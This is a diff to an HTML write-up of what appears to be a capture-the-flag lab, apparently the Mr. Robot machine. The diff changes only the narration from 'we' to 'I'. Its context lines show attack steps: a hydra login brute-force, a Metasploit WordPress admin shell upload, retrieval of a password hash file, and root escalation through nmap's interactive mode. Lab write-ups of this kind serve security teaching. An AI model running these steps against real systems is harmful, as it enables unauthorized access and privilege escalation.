@@ -131,7 +131,7 @@ hydra <span class="token parameter variable">-l</span> elliot <span class="token
 </ul>
 <p><img src="image_r9.png" alt="alt text"></p>
 <p><strong>Gaining Initial Access via WordPress</strong><br>
-We can utilize the WordPress administrative access to establish a managed shell on the web server using Metasploit as part of the authorized assessment.</p>
+I can utilize the WordPress administrative access to establish a managed shell on the web server using Metasploit as part of the authorized assessment.</p>
 <pre data-role="codeBlock" data-info="bash" class="language-bash bash"><code><span class="token comment">### bash</span>
 <span class="token comment">### Metasploit WordPress Admin Shell</span>
 msfconsole
@@ -152,7 +152,7 @@ use exploit/unix/webapp/wp_admin_shell_upload
     </ul>
   </li>
 </ul>
-<p>Using the WordPress-admin-derived shell, we accessed the /home/robot directory and retrieved the password.raw-md5 file, which contains the hashed password for the user robot; access to key-2-of-3.txt was denied due to insufficient permissions.</p>
+<p>Using the WordPress-admin-derived shell, I accessed the /home/robot directory and retrieved the password.raw-md5 file, which contains the hashed password for the user robot; access to key-2-of-3.txt was denied due to insufficient permissions.</p>
 <p><img src="image_12.png" alt="alt text"></p>
 <ul>
 <li>The exploit was executed, resulting in a Meterpreter session on the target system.</li>
@@ -201,7 +201,7 @@ use exploit/unix/webapp/wp_admin_shell_upload
     nmap <span class="token parameter variable">--interactive</span>
 </code></pre><p><img src="image_18.png" alt="alt text"></p>
 <ul>
-<li>In interactive mode, we can execute shell commands by using the ! (exclamation mark) followed by the command.</li>
+<li>In interactive mode, I can execute shell commands by using the ! (exclamation mark) followed by the command.</li>
 </ul>
 <pre data-role="codeBlock" data-info="bash" class="language-bash bash"><code>    nmap<span class="token operator">&gt;</span> <span class="token operator">!</span> <span class="token function">whoami</span>
     root
